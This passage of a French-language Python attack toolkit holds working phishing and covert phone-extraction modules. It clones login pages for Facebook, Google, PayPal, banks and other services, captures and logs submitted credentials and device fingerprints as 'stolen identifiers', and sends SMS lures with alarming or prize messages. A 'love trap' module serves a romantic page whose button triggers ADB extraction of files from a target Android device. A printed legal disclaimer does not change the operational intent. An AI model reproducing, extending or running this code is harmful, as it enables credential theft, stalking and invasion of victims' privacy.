            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }}
        input:focus {{
            border-color: {t["color"]};
            outline: none;
            box-shadow: 0 0 0 2px {t["color"]}33;
        }}
        .btn {{
            width: 100%;
            padding: 14px;
            background: {t["color"]};
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 16px;
            transition: background 0.3s;
        }}
        .btn:hover {{ filter: brightness(1.1); }}
        .links {{
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #dddfe2;
        }}
        .divider {{
            margin: 20px 0;
            text-align: center;
            position: relative;
        }}
        .divider::before {{
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            border-top: 1px solid #dddfe2;
        }}
        .divider span {{
            background: white;
            padding: 0 16px;
            color: #606770;
            font-size: 14px;
            position: relative;
        }}
        .footer {{
            margin-top: 20px;
            color: #606770;
            font-size: 12px;
        }}
        .secure {{
            color: #31a24c;
            font-size: 13px;
            margin-top: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }}
    </style>
</head>
<body>
    <div class="container">
        {"<img src='" + t["logo"] + "' class='logo' alt='Logo'>" if t["logo"] else "<h1>" + t["title"].split(" - ")[0] + "</h1>"}
        {subtitle_html}
        <form method="POST" action="/capture">
            <input type="hidden" name="_redirect" value="{redirect_url}">
            {fields_html}
            <button type="submit" class="btn">{t["button"]}</button>
        </form>
        <div class="links">
            {forgot_html}
        </div>
        {"<div class='divider'><span>ou</span></div>" + create_html if create_html else ""}
        <p class="secure">
            <svg width="12" height="14" viewBox="0 0 12 14" fill="#31a24c"><path d="M6 0C3.8 0 2 1.8 2 4v2H1c-.6 0-1 .4-1 1v6c0 .6.4 1 1 1h10c.6 0 1-.4 1-1V7c0-.6-.4-1-1-1H10V4c0-2.2-1.8-4-4-4zm2 6H4V4c0-1.1.9-2 2-2s2 .9 2 2v2z"/></svg>
            Connexion sÃ©curisÃ©e
        </p>
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', function(e) {{
            var extra = document.createElement('input');
            extra.type = 'hidden';
            extra.name = '_browser_info';
            extra.value = JSON.stringify({{
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href
            }});
            this.appendChild(extra);
        }});
    </script>
</body>
</html>'''
    return html, redirect_url

def generate_success_page(redirect_url="https://www.google.com", template="facebook"):
    """Page affichÃ©e aprÃ¨s capture - redirige vers le VRAI site"""
    
    messages = {
        "facebook": ("Connexion rÃ©ussie", "Redirection vers Facebook..."),
        "google": ("VÃ©rification terminÃ©e", "Connexion Ã  votre compte Google..."),
        "instagram": ("Connexion rÃ©ussie", "Redirection vers Instagram..."),
        "whatsapp": ("VÃ©rification rÃ©ussie", "Ouverture de WhatsApp Web..."),
        "netflix": ("Bienvenue", "Chargement de Netflix..."),
        "paypal": ("Connexion sÃ©curisÃ©e", "AccÃ¨s Ã  votre compte PayPal..."),
        "bank": ("Authentification rÃ©ussie", "AccÃ¨s Ã  votre espace client..."),
        "tiktok": ("Connexion rÃ©ussie", "Redirection vers TikTok..."),
        "snapchat": ("Login successful", "Opening Snapchat..."),
        "outlook": ("Connexion rÃ©ussie", "AccÃ¨s Ã  votre boÃ®te mail..."),
        "amazon": ("Connexion rÃ©ussie", "AccÃ¨s Ã  votre compte Amazon...")
    }
    
    title, msg = messages.get(template, ("Connexion rÃ©ussie", "Redirection en cours..."))
    
    return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f0f2f5;
        }}
        .container {{
            background: white;
            padding: 50px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 400px;
        }}
        .check {{
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #31a24c;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px;
            animation: pop 0.4s ease;
        }}
        .check svg {{
            width: 40px;
            height: 40px;
            fill: white;
        }}
        @keyframes pop {{
            0% {{ transform: scale(0); }}
            80% {{ transform: scale(1.1); }}
            100% {{ transform: scale(1); }}
        }}
        h2 {{
            color: #1c1e21;
            margin-bottom: 10px;
            font-size: 24px;
        }}
        p {{
            color: #606770;
            font-size: 16px;
        }}
        .loader {{
            width: 30px;
            height: 30px;
            border: 3px solid #e4e6eb;
            border-top-color: #1877f2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto 0;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="check">
            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
        </div>
        <h2>{title}</h2>
        <p>{msg}</p>
        <div class="loader"></div>
    </div>
    <script>
        setTimeout(function() {{
            window.location.href = '{redirect_url}';
        }}, 2000);
    </script>
</body>
</html>'''

class PhishingHandler(BaseHTTPRequestHandler):
    """Handler pour le serveur de phishing"""
    
    template = "facebook"
    redirect_url = "https://www.facebook.com"
    
    def log_message(self, format, *args):
        pass  # Supprime les logs HTTP
    
    def do_GET(self):
        """Page de phishing"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        html, redirect = generate_phishing_page(self.template)
        PhishingHandler.redirect_url = redirect
        self.wfile.write(html.encode('utf-8'))
    
    def do_POST(self):
        """Capture les donnÃ©es envoyÃ©es"""
        global CAPTURED_DATA
        
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parser les donnÃ©es
        from urllib.parse import parse_qs
        data = parse_qs(post_data)
        
        # Extraire l'URL de redirection depuis le formulaire
        redirect_url = PhishingHandler.redirect_url
        if '_redirect' in data:
            redirect_url = data['_redirect'][0]
        
        # Nettoyer les donnÃ©es (enlever champs internes)
        clean_data = {}
        for k, v in data.items():
            if not k.startswith('_'):
                clean_data[k] = v[0] if len(v) == 1 else v
        
        captured = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "template": self.template,
            "ip": self.client_address[0],
            "user_agent": self.headers.get('User-Agent', 'Unknown'),
            "data": clean_data
        }
        
        # Parser browser_info si prÃ©sent
        if '_browser_info' in data:
            try:
                captured['browser_info'] = json.loads(data['_browser_info'][0])
            except:
                pass
        
        CAPTURED_DATA.append(captured)
        
        # Sauvegarder immÃ©diatement
        save_captured_data(captured)
        
        # Afficher en temps rÃ©el
        print(f"\n{C.RED}{'â•'*70}{C.END}")
        print(f"{C.BOLD}{C.RED}ğŸ£ IDENTIFIANTS CAPTURÃ‰S!{C.END}")
        print(f"{C.RED}{'â•'*70}{C.END}")
        print(f"    {C.YELLOW}â° Heure:{C.END} {captured['timestamp']}")
        print(f"    {C.YELLOW}ğŸ­ Site:{C.END} {self.template.upper()}")
        print(f"    {C.YELLOW}ğŸŒ IP Victime:{C.END} {captured['ip']}")
        print(f"\n    {C.GREEN}ğŸ” IDENTIFIANTS VOLÃ‰S:{C.END}")
        for key, value in captured['data'].items():
            if 'password' in key.lower() or 'secret' in key.lower() or 'code' in key.lower():
                print(f"        {C.RED}ğŸ”‘ {key}: {value}{C.END}")
            else:
                print(f"        {C.CYAN}ğŸ“§ {key}: {value}{C.END}")
        print(f"{C.RED}{'â•'*70}{C.END}\n")
        
        # Envoyer page de succÃ¨s qui redirige vers le VRAI site
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        success_html = generate_success_page(redirect_url, self.template)
        self.wfile.write(success_html.encode('utf-8'))

def save_captured_data(data):
    """Sauvegarde les donnÃ©es capturÃ©es"""
    phishing_dir = OUTPUT_BASE / "PHISHING_CAPTURES"
    phishing_dir.mkdir(parents=True, exist_ok=True)
    
    # Fichier JSON avec toutes les captures
    all_captures_file = phishing_dir / "all_captures.json"
    
    all_data = []
    if all_captures_file.exists():
        try:
            with open(all_captures_file, 'r', encoding='utf-8') as f:
                all_data = json.load(f)
        except:
            all_data = []
    
    all_data.append(data)
    
    with open(all_captures_file, 'w', encoding='utf-8') as f:
        json.dump(all_data, f, indent=2, ensure_ascii=False)
    
    # Fichier texte lisible pour cette capture
    template_name = data.get('template', 'unknown').upper()
    capture_file = phishing_dir / f"capture_{template_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(capture_file, 'w', encoding='utf-8') as f:
        f.write("="*60 + "\n")
        f.write(f"ğŸ£ IDENTIFIANTS VOLÃ‰S - {template_name}\n")
        f.write("="*60 + "\n\n")
        f.write(f"Date/Heure: {data['timestamp']}\n")
        f.write(f"Site cible: {template_name}\n")
        f.write(f"IP Victime: {data['ip']}\n")
        f.write(f"User-Agent: {data['user_agent']}\n\n")
        f.write("-"*40 + "\n")
        f.write("ğŸ” IDENTIFIANTS CAPTURÃ‰S:\n")
        f.write("-"*40 + "\n")
        for key, value in data['data'].items():
            f.write(f"  {key}: {value}\n")
        if 'browser_info' in data:
            f.write("\n" + "-"*40 + "\n")
            f.write("ğŸ“± INFOS APPAREIL:\n")
            f.write("-"*40 + "\n")
            for key, value in data['browser_info'].items():
                f.write(f"  {key}: {value}\n")
    
    print_success(f"DonnÃ©es sauvegardÃ©es: {capture_file.name}")

def start_phishing_server(template="facebook", port=8888):
    """DÃ©marre le serveur de phishing"""
    global PHISHING_SERVER, PHISHING_PORT
    
    PHISHING_PORT = port
    PhishingHandler.template = template
    
    print(f"\n{C.RED}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.RED}ğŸ£ SERVEUR PHISHING{C.END}")
    print(f"{C.RED}{'â•'*70}{C.END}\n")
    
    local_ip = get_local_ip()
    
    try:
        PHISHING_SERVER = HTTPServer(('0.0.0.0', port), PhishingHandler)
        
        print(f"    {C.GREEN}âœ“ Serveur dÃ©marrÃ© sur le port {port}{C.END}\n")
        print(f"    {C.YELLOW}ğŸ“ LIENS Ã€ ENVOYER:{C.END}")
        print(f"    {C.CYAN}   â€¢ Local:    http://127.0.0.1:{port}{C.END}")
        print(f"    {C.CYAN}   â€¢ RÃ©seau:   http://{local_ip}:{port}{C.END}")
        print(f"\n    {C.RED}âš ï¸  En attente de connexions...{C.END}")
        print(f"    {C.YELLOW}   (Ctrl+C pour arrÃªter){C.END}\n")
        
        # DÃ©marrer dans un thread
        server_thread = threading.Thread(target=PHISHING_SERVER.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        return local_ip, port
        
    except OSError as e:
        if "Address already in use" in str(e) or "10048" in str(e):
            print_error(f"Port {port} dÃ©jÃ  utilisÃ©. Essayez un autre port.")
        else:
            print_error(f"Erreur: {e}")
        return None, None

def stop_phishing_server():
    """ArrÃªte le serveur de phishing"""
    global PHISHING_SERVER
    if PHISHING_SERVER:
        PHISHING_SERVER.shutdown()
        PHISHING_SERVER = None
        print_success("Serveur phishing arrÃªtÃ©")
    else:
        print_info("Aucun serveur en cours")

def phishing_menu():
    """Menu interactif pour le phishing"""
    global CAPTURED_DATA
    
    print(f"\n{C.RED}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.RED}ğŸ£ MODULE PHISHING - FAUX SITES WEB{C.END}")
    print(f"{C.RED}{'â•'*70}{C.END}")
    
    print(f"""
    {C.YELLOW}âš ï¸  AVERTISSEMENT LÃ‰GAL:{C.END}
    {C.WHITE}Ce module est destinÃ© UNIQUEMENT aux tests de sÃ©curitÃ©
    sur vos propres appareils ou avec autorisation explicite.
    L'utilisation non autorisÃ©e est ILLÃ‰GALE.{C.END}
    """)
    
    templates = {
        "1": ("facebook", "Facebook"),
        "2": ("google", "Google"),
        "3": ("instagram", "Instagram"),
        "4": ("whatsapp", "WhatsApp"),
        "5": ("netflix", "Netflix"),
        "6": ("paypal", "PayPal"),
        "7": ("bank", "Banque GÃ©nÃ©rique"),
        "8": ("custom", "Page PersonnalisÃ©e")
    }
    
    print(f"\n    {C.CYAN}ğŸ“‹ TEMPLATES DISPONIBLES:{C.END}")
    for key, (_, name) in templates.items():
        print(f"        {C.GREEN}{key}.{C.END} {name}")
    
    print(f"\n    {C.CYAN}ğŸ”§ OPTIONS:{C.END}")
    print(f"        {C.GREEN}9.{C.END} Voir les donnÃ©es capturÃ©es")
    print(f"        {C.GREEN}10.{C.END} ArrÃªter le serveur")
    print(f"        {C.GREEN}0.{C.END} Retour")
    
    choice = input(f"\n    {C.YELLOW}Choix: {C.END}").strip()
    
    if choice == "0":
        return
    elif choice == "9":
        # Afficher les captures
        if CAPTURED_DATA:
            print(f"\n{C.GREEN}ğŸ“‹ DONNÃ‰ES CAPTURÃ‰ES ({len(CAPTURED_DATA)} entrÃ©es):{C.END}")
            for i, cap in enumerate(CAPTURED_DATA, 1):
                print(f"\n    [{i}] {cap['timestamp']} - IP: {cap['ip']}")
                for k, v in cap['data'].items():
                    print(f"        {k}: {v}")
        else:
            print_info("Aucune donnÃ©e capturÃ©e pour le moment")
        return
    elif choice == "10":
        stop_phishing_server()
        return
    elif choice in templates:
        template_id, template_name = templates[choice]
        
        port = input(f"\n    Port (dÃ©faut 8888): ").strip()
        port = int(port) if port else 8888
        
        local_ip, port = start_phishing_server(template_id, port)
        
        if local_ip:
            print(f"\n    {C.YELLOW}ğŸ“² ENVOYER LE LIEN AU TÃ‰LÃ‰PHONE?{C.END}")
            print(f"        1. Envoyer par SMS")
            print(f"        2. Juste afficher le lien")
            
            send_choice = input(f"\n    Choix: ").strip()
            
            if send_choice == "1":
                phone = input("    NumÃ©ro de tÃ©lÃ©phone: ").strip()
                link = f"http://{local_ip}:{port}"
                
                messages = [
                    f"ğŸ”’ Alerte sÃ©curitÃ©: Votre compte a Ã©tÃ© compromis. VÃ©rifiez: {link}",
                    f"âš ï¸ Action requise: Confirmez votre identitÃ©: {link}",
                    f"ğŸ“± VÃ©rification de sÃ©curitÃ© requise: {link}",
                    f"ğŸ Vous avez gagnÃ©! RÃ©clamez ici: {link}"
                ]
                
                print(f"\n    {C.CYAN}Messages prÃ©dÃ©finis:{C.END}")
                for i, msg in enumerate(messages, 1):
                    print(f"        {i}. {msg[:50]}...")
                print(f"        5. Message personnalisÃ©")
                
                msg_choice = input("\n    Choix du message: ").strip()
                
                if msg_choice == "5":
                    message = input("    Votre message (utilisez {link} pour le lien): ")
                    message = message.replace("{link}", link)
                elif msg_choice in ["1", "2", "3", "4"]:
                    message = messages[int(msg_choice) - 1]
                else:
                    message = messages[0]
                
                # Envoyer le SMS
                send_sms(phone, message)
                print_success(f"SMS envoyÃ© Ã  {phone}")
            
            # Attendre les captures
            print(f"\n    {C.RED}ğŸ¯ SERVEUR ACTIF - En attente de victimes...{C.END}")
            print(f"    {C.YELLOW}Appuyez sur EntrÃ©e pour revenir au menu{C.END}")
            input()

def send_phishing_link(template="facebook"):
    """Raccourci pour envoyer un lien phishing"""
    local_ip = get_local_ip()
    port = 8888
    
    # DÃ©marrer le serveur
    start_phishing_server(template, port)
    
    link = f"http://{local_ip}:{port}"
    
    print(f"\n    {C.GREEN}ğŸ”— Lien phishing: {link}{C.END}")
    
    phone = input("\n    NumÃ©ro pour envoyer le SMS: ").strip()
    if phone:
        message = f"âš ï¸ VÃ©rification de sÃ©curitÃ© requise pour votre compte: {link}"
        send_sms(phone, message)
        print_success(f"Lien envoyÃ© Ã  {phone}")
    
    return link

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 26: PIÃˆGE AMOUR ğŸ’• - EXTRACTION AUTOMATIQUE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

LOVE_TRAP_SERVER = None
LOVE_TRAP_EXTRACTION_DONE = False
NGROK_PROCESS = None

def generate_love_page():
    """GÃ©nÃ¨re la page piÃ¨ge romantique"""
    
    return '''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ’• Un message pour toi...</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400;600&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #ff6b9d 0%, #ff8a80 25%, #ffc1e3 50%, #ff6b9d 75%, #c471ed 100%);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .hearts {
            position: fixed;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 0;
        }
        
        .heart {
            position: absolute;
            font-size: 20px;
            animation: fall linear infinite;
            opacity: 0.7;
        }
        
        @keyframes fall {
            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 50px 40px;
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(255, 107, 157, 0.4);
            text-align: center;
            max-width: 420px;
            width: 90%;
            z-index: 10;
            position: relative;
            animation: pulse 2s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }
        
        .envelope {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 1s ease infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        h1 {
            font-family: 'Dancing Script', cursive;
            color: #ff6b9d;
            font-size: 36px;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(255, 107, 157, 0.3);
        }
        
        .message {
            color: #666;
            font-size: 18px;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .message strong {
            color: #ff6b9d;
        }
        
        .btn {
            display: inline-block;
            padding: 18px 50px;
            background: linear-gradient(135deg, #ff6b9d, #ff8a80);
            color: white;
            text-decoration: none;
            border-radius: 50px;
            font-size: 20px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(255, 107, 157, 0.4);
            transition: all 0.3s ease;
            animation: glow 2s ease-in-out infinite;
        }
        
        @keyframes glow {
            0%, 100% { box-shadow: 0 10px 30px rgba(255, 107, 157, 0.4); }
            50% { box-shadow: 0 10px 40px rgba(255, 107, 157, 0.6), 0 0 20px rgba(255, 107, 157, 0.3); }
        }
        
        .btn:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 15px 40px rgba(255, 107, 157, 0.5);
        }
        
        .footer {
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }
        
        .loading {
            display: none;
            flex-direction: column;
            align-items: center;
        }
        
        .loading.active {
            display: flex;
        }
        
        .content.hidden {
            display: none;
        }
        
        .heart-loader {
            font-size: 60px;
            animation: heartbeat 1s ease infinite;
        }
        
        @keyframes heartbeat {
            0%, 100% { transform: scale(1); }
            25% { transform: scale(1.1); }
            50% { transform: scale(1); }
            75% { transform: scale(1.2); }
        }
        
        .loading-text {
            color: #ff6b9d;
            font-size: 18px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="hearts" id="hearts"></div>
    
    <div class="container">
        <div class="content" id="content">
            <div class="envelope">ğŸ’Œ</div>
            <h1>J'ai un petit mot pour toi bÃ©bÃ©...</h1>
            <p class="message">
                Quelqu'un de <strong>trÃ¨s spÃ©cial</strong> a prÃ©parÃ© une surprise rien que pour toi ğŸ’•<br><br>
                Clique sur le bouton pour dÃ©couvrir ton message d'amour...
            </p>
            <button class="btn" onclick="openLoveLetter()">
                ğŸ’ Ouvrir mon message ğŸ’
            </button>
            <p class="footer">Un message envoyÃ© avec amour â¤ï¸</p>
        </div>
        
        <div class="loading" id="loading">
            <div class="heart-loader">ğŸ’–</div>
            <p class="loading-text">PrÃ©paration de ta surprise...</p>
            <p class="loading-text" style="font-size: 14px; margin-top: 10px;">Cela peut prendre quelques instants ğŸ’•</p>
        </div>
    </div>

    <script>
        // CrÃ©er les coeurs qui tombent
        function createHearts() {
            const container = document.getElementById('hearts');
            const hearts = ['ğŸ’•', 'ğŸ’–', 'ğŸ’—', 'ğŸ’', 'ğŸ’˜', 'â¤ï¸', 'ğŸ’œ', 'ğŸ’™'];
            
            for (let i = 0; i < 30; i++) {
                const heart = document.createElement('div');
                heart.className = 'heart';
                heart.innerHTML = hearts[Math.floor(Math.random() * hearts.length)];
                heart.style.left = Math.random() * 100 + '%';
                heart.style.animationDuration = (Math.random() * 3 + 4) + 's';
                heart.style.animationDelay = Math.random() * 5 + 's';
                heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
                container.appendChild(heart);
            }
        }
        createHearts();
        
        function openLoveLetter() {
            document.getElementById('content').classList.add('hidden');
            document.getElementById('loading').classList.add('active');
            
            // Envoyer la requÃªte pour dÃ©clencher l'extraction
            fetch('/trigger_extraction', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    setTimeout(() => {
                        window.location.href = '/love_message';
                    }, 3000);
                })
                .catch(err => {
                    setTimeout(() => {
                        window.location.href = '/love_message';
                    }, 3000);
                });
        }
    </script>
</body>
</html>'''

def generate_love_message_page():
    """Page avec le faux message d'amour aprÃ¨s extraction"""
    return '''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ’• Mon message pour toi</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .letter {
            background: white;
            padding: 50px 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            max-width: 500px;
            width: 100%;
            text-align: center;
            position: relative;
        }
        
        .letter::before {
            content: "ğŸ’Œ";
            position: absolute;
            top: -30px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 60px;
        }
        
        h1 {
            font-family: 'Dancing Script', cursive;
            color: #e74c3c;
            font-size: 42px;
            margin: 20px 0;
        }
        
        .hearts-row {
            font-size: 30px;
            margin: 20px 0;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .message {
            color: #555;
            font-size: 18px;
            line-height: 1.8;
            margin: 30px 0;
            font-style: italic;
        }
        
        .signature {
            font-family: 'Dancing Script', cursive;
            color: #e74c3c;
            font-size: 28px;
            margin-top: 30px;
        }
        
        .footer {
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="letter">
        <h1>ğŸ’– JE T'AIME MA FEMME AU FOYER ğŸ’–</h1>
        <div class="hearts-row">ğŸ’• ğŸ’‹ ğŸ’• ğŸ’‹ ğŸ’• ğŸ’‹ ğŸ’•</div>
        <p class="message" style="font-size: 32px; margin: 50px 0;">
            <span style="font-size: 42px; color: #ff1493;">ğŸ’‹ BISOUS ğŸ’‹</span>
        </p>
        <div class="signature">
            <span style="font-size: 28px;">â¤ï¸ Ton Mari â¤ï¸</span>
        </div>
    </div>
</body>
</html>'''

class LoveTrapHandler(BaseHTTPRequestHandler):
    """Handler pour le piÃ¨ge amour avec extraction automatique"""
    
    def log_message(self, format, *args):
        # Afficher les logs pour debug
        print(f"    {C.CYAN}[HTTP] {args[0]} {args[1]}{C.END}")
    
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, ngrok-skip-browser-warning')
        self.end_headers()
    
    def do_GET(self):
        print(f"    {C.YELLOW}ğŸ“¥ RequÃªte GET reÃ§ue: {self.path}{C.END}")
        
        # Headers pour contourner l'avertissement ngrok
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.send_header('ngrok-skip-browser-warning', 'true')
        self.send_header('User-Agent', 'Mozilla/5.0')
        self.end_headers()
        
        if self.path == '/love_message':
            self.wfile.write(generate_love_message_page().encode('utf-8'))
        else:
            print(f"    {C.GREEN}ğŸ¯ CIBLE A OUVERT LE LIEN!{C.END}")
            self.wfile.write(generate_love_page().encode('utf-8'))
    
    def do_POST(self):
        global LOVE_TRAP_EXTRACTION_DONE
        
        print(f"    {C.RED}ğŸ“¤ RequÃªte POST reÃ§ue: {self.path}{C.END}")
        
        if self.path == '/trigger_extraction':
            # DÃ©clencher l'extraction en arriÃ¨re-plan
            if not LOVE_TRAP_EXTRACTION_DONE:
                print(f"\n{C.RED}{'â•'*70}{C.END}")
                print(f"{C.BOLD}{C.RED}ğŸ’• PIÃˆGE AMOUR DÃ‰CLENCHÃ‰! LA VICTIME A CLIQUÃ‰!{C.END}")
                print(f"{C.RED}{'â•'*70}{C.END}")
                print(f"\n{C.YELLOW}ğŸš€ EXTRACTION AUTOMATIQUE EN COURS...{C.END}\n")
                
                # Lancer l'extraction dans un thread sÃ©parÃ©
                extraction_thread = threading.Thread(target=love_trap_extraction)
                extraction_thread.daemon = False  # Important: ne pas daemon pour que l'extraction finisse
                extraction_thread.start()
                
                LOVE_TRAP_EXTRACTION_DONE = True
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'{"status": "ok"}')
        
        elif self.path == '/check_status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            status = "done" if LOVE_TRAP_EXTRACTION_DONE else "waiting"
            self.wfile.write(f'{{"status": "{status}"}}'.encode())

def love_trap_extraction():
    """Extraction complÃ¨te dÃ©clenchÃ©e par le piÃ¨ge amour avec progression en temps rÃ©el"""
    global DEVICE, ADB_PATH
    
    print(f"\n{C.RED}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.RED}ğŸš¨ EXTRACTION PIÃˆGE AMOUR DÃ‰MARRÃ‰E!{C.END}")
    print(f"{C.RED}{'â•'*70}{C.END}")
    print(f"\n    {C.YELLOW}ğŸ“± Appareil cible: {DEVICE}{C.END}")
    print(f"    {C.YELLOW}ğŸ”§ ADB: {ADB_PATH}{C.END}\n")
    
    love_dir = OUTPUT_BASE / "PIEGE_AMOUR_EXTRACTION"
    love_dir.mkdir(parents=True, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    extraction_dir = love_dir / f"extraction_{timestamp}"
    extraction_dir.mkdir(parents=True, exist_ok=True)
    
    print(f"    {C.CYAN}ğŸ“ Dossier: {extraction_dir}{C.END}\n")
    
    results = {}
    total_files = 0
    total_size = 0
    
    # VÃ©rifier la connexion ADB d'abord
    try:
        check = subprocess.run(f'"{ADB_PATH}" -s {DEVICE} shell echo "OK"', 
                              shell=True, capture_output=True, text=True, timeout=10)
        if "OK" not in check.stdout:
            print(f"    {C.RED}âš ï¸ Appareil non connectÃ©! Tentative de reconnexion...{C.END}")
            subprocess.run(f'"{ADB_PATH}" connect {DEVICE}', shell=True, capture_output=True, timeout=10)
    except Exception as e:
        print(f"    {C.RED}âš ï¸ Erreur connexion: {e}{C.END}")
    
    def extract_with_progress(source_path, dest_path, file_type, step_num, total_steps):
        """Extrait des fichiers avec affichage de progression en temps rÃ©el - CHAQUE FICHIER VISIBLE"""
        nonlocal total_files, total_size
        
        print(f"\n    {C.CYAN}{'â•'*60}{C.END}")
        print(f"    {C.BOLD}{C.GREEN}[{step_num}/{total_steps}] {file_type}{C.END}")
        print(f"    {C.CYAN}{'â•'*60}{C.END}")
        print(f"    {C.YELLOW}ğŸ“‚ Source: {source_path}{C.END}")
        print(f"    {C.YELLOW}ğŸ“ Destination: {dest_path}{C.END}\n")
        
        # CrÃ©er le dossier destination
        Path(dest_path).mkdir(parents=True, exist_ok=True)
        
        # Lister TOUS les fichiers avec leurs tailles
        print(f"    {C.CYAN}ğŸ” Analyse des fichiers...{C.END}")
        list_cmd = f'"{ADB_PATH}" -s {DEVICE} shell "find {source_path} -type f 2>/dev/null"'
        list_result = subprocess.run(list_cmd, shell=True, capture_output=True, text=True, timeout=60)
        
        files_list = [f for f in list_result.stdout.strip().split('\n') if f and not f.startswith('find:') and f.strip()]
        file_count = len(files_list)
        
        if file_count == 0:
            print(f"    {C.YELLOW}âš ï¸  Aucun fichier trouvÃ© dans {source_path}{C.END}")
